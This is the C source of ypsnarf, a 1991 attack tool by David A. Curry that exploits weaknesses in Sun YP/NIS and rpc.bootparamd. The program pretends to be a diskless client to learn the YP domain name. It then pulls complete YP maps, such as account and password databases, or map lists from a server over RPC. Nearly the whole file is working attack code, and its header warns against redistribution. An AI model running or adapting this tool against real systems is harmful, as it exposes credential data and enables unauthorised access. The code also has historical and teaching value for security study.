/*
 * THIS PROGRAM EXERCISES SECURITY HOLES THAT, WHILE GENERALLY KNOWN IN
 * THE UNIX SECURITY COMMUNITY, ARE NEVERTHELESS STILL SENSITIVE SINCE
 * IT REQUIRES SOME BRAINS TO TAKE ADVANTAGE OF THEM.  PLEASE DO NOT
 * REDISTRIBUTE THIS PROGRAM TO ANYONE YOU DO NOT TRUST COMPLETELY.
 *
 * ypsnarf - exercise security holes in yp/nis.
 *
 * Based on code from Dan Farmer (zen@death.corp.sun.com) and Casper Dik
 * (casper@fwi.uva.nl).
 *
 * Usage:
 *  ypsnarf server client
 *   - to obtain the yp domain name
 *  ypsnarf server domain mapname
 *   - to obtain a copy of a yp map
 *  ypsnarf server domain maplist
 *   - to obtain a list of yp maps
 *
 * In the first case, we lie and pretend to be the host "client", and send
 * a BOOTPARAMPROC_WHOAMI request to the host "server".  Note that for this
 * to work, "server" must be running rpc.bootparamd, and "client" must be a
 * diskless client of (well, it must boot from) "server".
 *
 * In the second case, we send a YPPROC_DOMAIN request to the host "server",
 * asking if it serves domain "domain".  If so, we send YPPROC_FIRST and
 * YPPROC_NEXT requests (just like "ypcat") to obtain a copy of the yp map
 * "mapname".  Note that you must specify the full yp map name, you cannot
 * use the shorthand names provided by "ypcat".
 *
 * In the third case, the special map name "maplist" tells ypsnarf to send
 * a YPPROC_MAPLIST request to the server and get the list of maps in domain
 * "domain", instead of getting the contents of a map.  If the server has a
 * map called "maplist" you can't get it.  Oh well.
 *
 * Since the callrpc() routine does not make any provision for timeouts, we
 * artificially impose a timeout of YPSNARF_TIMEOUT1 seconds during the
 * initial requests, and YPSNARF_TIMEOUT2 seconds during a map transfer.
 *
 * This program uses UDP packets, which means there's a chance that things
 * will get dropped on the floor; it's not a reliable stream like TCP.  In
 * practice though, this doesn't seem to be a problem.
 *
 * To compile:
 *  cc -o ypsnarf ypsnarf.c -lrpcsvc
 *
 * David A. Curry
 * Purdue University
 * Engineering Computer Network
 * Electrical Engineering Building
 * West Lafayette, IN 47907
 * davy@ecn.purdue.edu
 * January, 1991
 */
#include <sys/param.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <rpc/rpc.h>
#include <rpcsvc/bootparam.h>
#include <rpcsvc/yp_prot.h>
#include <rpc/pmap_clnt.h>
#include <sys/time.h>
#include <signal.h>
#include <string.h>
#include <netdb.h>
#include <stdio.h>

#ifdef __LINUX__
#include <rpc/xdr.h>
#include <stdbool.h>
#endif

#define BOOTPARAM_MAXDOMAINLEN 32 /* from rpc.bootparamd  */
#define YPSNARF_TIMEOUT1 15 /* timeout for initial request */
#define YPSNARF_TIMEOUT2 30 /* timeout during map transfer */

char *pname;    /* program name   */

main(argc, argv)
char **argv;
int argc;
{
 char *server, *client, *domain, *mapname;

 pname = *argv;

 /*
  * Process arguments.  This is less than robust, but then
  * hey, you're supposed to know what you're doing.
  */
 switch (argc) {
 case 3:
  server = *++argv;
  client = *++argv;

  get_yp_domain(server, client);
  exit(0);
 case 4:
  server = *++argv;
  domain = *++argv;
  mapname = *++argv;

  if (strcmp(mapname, "maplist") == 0)
   get_yp_maplist(server, domain);
  else
   get_yp_map(server, domain, mapname);
  exit(0);
 default:
  fprintf(stderr, "Usage: %s server client         -", pname);
  fprintf(stderr, "to obtain yp domain name\n");
  fprintf(stderr, "       %s server domain mapname -", pname);
  fprintf(stderr, "to obtain contents of yp map\n");
  exit(1);
 }
}

/*
 * get_yp_domain - figure out the yp domain used between server and client.
 */
get_yp_domain(server, client)
char *server, *client;
{
 long hostip;
 struct hostent *hp;
 bp_whoami_arg w_arg;
 bp_whoami_res w_res;
 extern void timeout();
 enum clnt_stat errcode;

 /*
  * Just a sanity check, here.
  */
 if ((hp = gethostbyname(server)) == NULL) {
  fprintf(stderr, "%s: %s: unknown host.\n", pname, server);
  exit(1);
 }

 /*
  * Allow the client to be either an internet address or a
  * host name.  Copy in the internet address.
  */
 if ((hostip = inet_addr(client)) == -1) {
  if ((hp = gethostbyname(client)) == NULL) {
   fprintf(stderr, "%s: %s: unknown host.\n", pname,
    client);
   exit(1);
  }

  bcopy(hp->h_addr_list[0],
        (caddr_t) &w_arg.client_address.bp_address_u.ip_addr,
        hp->h_length);
 }
 else {
  bcopy((caddr_t) &hostip,
        (caddr_t) &w_arg.client_address.bp_address_u.ip_addr,
        sizeof(ip_addr_t));
 }

 w_arg.client_address.address_type = IP_ADDR_TYPE;
 bzero((caddr_t) &w_res, sizeof(bp_whoami_res));

 /*
  * Send a BOOTPARAMPROC_WHOAMI request to the server.  This will
  * give us the yp domain in the response, IFF client boots from
  * the server.
  */
 signal(SIGALRM, timeout);
 alarm(YPSNARF_TIMEOUT1);

 errcode = callrpc(server, BOOTPARAMPROG, BOOTPARAMVERS,
     BOOTPARAMPROC_WHOAMI, xdr_bp_whoami_arg, &w_arg,
     xdr_bp_whoami_res, &w_res);

 alarm(0);

 if (errcode != RPC_SUCCESS)
  print_rpc_err(errcode);

 /*
  * Print the domain name.
  */
 printf("%.*s", BOOTPARAM_MAXDOMAINLEN, w_res.domain_name);

 /*
  * The maximum domain name length is 255 characters, but the
  * rpc.bootparamd program truncates anything over 32 chars.
  */
 if (strlen(w_res.domain_name) >= BOOTPARAM_MAXDOMAINLEN)
  printf(" (truncated?)");

 /*
  * Put out the client name, if they didn't know it.
  */
 if (hostip != -1)
  printf(" (client name = %s)", w_res.client_name);

 putchar('\n');
}

/*
 * get_yp_map - get the yp map "mapname" from yp domain "domain" from server.
 */
get_yp_map(server, domain, mapname)
char *server, *domain, *mapname;
{
 char *reqp;
 bool_t yesno;
 u_long calltype;
#ifdef __LINUX__
 bool (*xdrproc_t)();
#else
 bool (*xdr_proc)();
#endif
 extern void timeout();
 enum clnt_stat errcode;
 struct ypreq_key keyreq;
 struct ypreq_nokey nokeyreq;
 struct ypresp_key_val answer;

 /*
  * This code isn't needed; the next call will give the same
  * error message if there's no yp server there.
  */
#ifdef not_necessary
 /*
  * "Ping" the yp server and see if it's there.
  */
 signal(SIGALRM, timeout);
 alarm(YPSNARF_TIMEOUT1);

 errcode = callrpc(host, YPPROG, YPVERS, YPPROC_NULL, xdr_void, 0,
     xdr_void, 0);

 alarm(0);

 if (errcode != RPC_SUCCESS)
  print_rpc_err(errcode);
#endif

 /*
  * Figure out whether server serves the yp domain we want.
  */
 signal(SIGALRM, timeout);
 alarm(YPSNARF_TIMEOUT1);

 errcode = callrpc(server, YPPROG, YPVERS, YPPROC_DOMAIN,
     xdr_wrapstring, (caddr_t) &domain, xdr_bool,
     (caddr_t) &yesno);

 alarm(0);

 if (errcode != RPC_SUCCESS)
  print_rpc_err(errcode);

 /*
  * Nope...
  */
 if (yesno == FALSE) {
  fprintf(stderr, "%s: %s does not serve domain %s.\n", pname,
   server, domain);
  exit(1);
 }

 /*
  * Now we just read entry after entry...  The first entry we
  * get with a nokey request.
  */
 keyreq.domain = nokeyreq.domain = domain;
 keyreq.map = nokeyreq.map = mapname;
 reqp = (caddr_t) &nokeyreq;
#ifdef __LINUX__
 keyreq.keydat.keydat_val = NULL;
#else
 keyreq.keydat.dptr = NULL;
#endif

 answer.status = TRUE;
 calltype = YPPROC_FIRST;
#ifdef __LINUX__
 xdrproc_t = xdr_ypreq_nokey;
#else
 xdr_proc = xdr_ypreq_nokey;
#endif

 while (answer.status == TRUE) {
  bzero((caddr_t) &answer, sizeof(struct ypresp_key_val));

  signal(SIGALRM, timeout);
  alarm(YPSNARF_TIMEOUT2);

#ifdef __LINUX__
  errcode = callrpc(server, YPPROG, YPVERS, calltype, xdrproc_t,
#else
  errcode = callrpc(server, YPPROG, YPVERS, calltype, xdr_proc,
#endif
      reqp, xdr_ypresp_key_val, &answer);

  alarm(0);

  if (errcode != RPC_SUCCESS)
   print_rpc_err(errcode);

  /*
   * Got something; print it.
   */
  if (answer.status == TRUE) {
#ifdef __LINUX__
   printf("%.*s\n", answer.valdat.valdat_len,
          answer.valdat.valdat_val);
#else
   printf("%.*s\n", answer.valdat.dsize,
          answer.valdat.dptr);
#endif
  }

  /*
   * Now we're requesting the next item, so have to
   * send back the current key.
   */
  calltype = YPPROC_NEXT;
  reqp = (caddr_t) &keyreq;
#ifdef __LINUX__
  xdrproc_t = xdr_ypreq_key;
#else
  xdr_proc = xdr_ypreq_key;
#endif

#ifdef __LINUX__
  if (keyreq.keydat.keydat_val)
   free(keyreq.keydat.keydat_val);
#else
  if (keyreq.keydat.dptr)
   free(keyreq.keydat.dptr);
#endif

  keyreq.keydat = answer.keydat;

#ifdef __LINUX__
  if (answer.valdat.valdat_val)
   free(answer.valdat.valdat_val);
#else
  if (answer.valdat.dptr)
   free(answer.valdat.dptr);
#endif
 }
}

/*
 * get_yp_maplist - get the yp map list for  yp domain "domain" from server.
 */
get_yp_maplist(server, domain)
char *server, *domain;
{
 bool_t yesno;
 extern void timeout();
 struct ypmaplist *mpl;
 enum clnt_stat errcode;
 struct ypresp_maplist maplist;

 /*
  * This code isn't needed; the next call will give the same
  * error message if there's no yp server there.
  */
#ifdef not_necessary
 /*
  * "Ping" the yp server and see if it's there.
  */
 signal(SIGALRM, timeout);
 alarm(YPSNARF_TIMEOUT1);

 errcode = callrpc(host, YPPROG, YPVERS, YPPROC_NULL, xdr_void, 0,
     xdr_void, 0);

 alarm(0);

 if (errcode != RPC_SUCCESS)
  print_rpc_err(errcode);
#endif

 /*
  * Figure out whether server serves the yp domain we want.
  */
 signal(SIGALRM, timeout);
 alarm(YPSNARF_TIMEOUT1);

 errcode = callrpc(server, YPPROG, YPVERS, YPPROC_DOMAIN,
     xdr_wrapstring, (caddr_t) &domain, xdr_bool,
     (caddr_t) &yesno);

 alarm(0);

 if (errcode != RPC_SUCCESS)
  print_rpc_err(errcode);

 /*
  * Nope...
  */
 if (yesno == FALSE) {
  fprintf(stderr, "%s: %s does not serve domain %s.\n", pname,
   server, domain);
  exit(1);
 }

 maplist.list = (struct ypmaplist *) NULL;

 /*
  * Now ask for the list.
  */
 signal(SIGALRM, timeout);
 alarm(YPSNARF_TIMEOUT1);

 errcode = callrpc(server, YPPROG, YPVERS, YPPROC_MAPLIST,
     xdr_wrapstring, (caddr_t) &domain,
     xdr_ypresp_maplist, &maplist);

 alarm(0);

 if (errcode != RPC_SUCCESS)
  print_rpc_err(errcode);

 if (maplist.status != YP_TRUE) {
  fprintf(stderr, "%s: cannot get map list: %s\n", pname,
   yperr_string(ypprot_err(maplist.status)));
  exit(1);
 }

 /*
  * Print out the list.
  */
 for (mpl = maplist.list; mpl != NULL; mpl = mpl->ypml_next)
  printf("%s\n", mpl->ypml_name);
}

/*
 * print_rpc_err - print an rpc error and exit.
 */
print_rpc_err(errcode)
enum clnt_stat errcode;
{
 fprintf(stderr, "%s: %s\n", pname, clnt_sperrno(errcode));
 exit(1);
}

/*
 * timeout - print a timeout and exit.
 */
void timeout()
{
 fprintf(stderr, "%s: RPC request (callrpc) timed out.\n", pname);
 exit(1);
}
